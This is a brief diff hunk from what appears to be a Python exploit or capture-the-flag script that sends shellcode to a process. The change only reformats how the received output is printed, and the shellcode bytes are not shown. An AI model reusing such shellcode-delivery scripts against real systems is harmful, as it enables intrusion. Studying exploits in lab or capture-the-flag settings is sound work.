@@ -19,7 +19,7 @@ print('1', shellcode)
 shellcode=bytes(shellcode)
 #print('1', shellcode)
 p.send(shellcode)
-print(p.recvall(), end='\\n' )
+print(p.recvall().decode("UTF-8"))
 
 #MSB                                    LSB
 #+----------------------------------------+
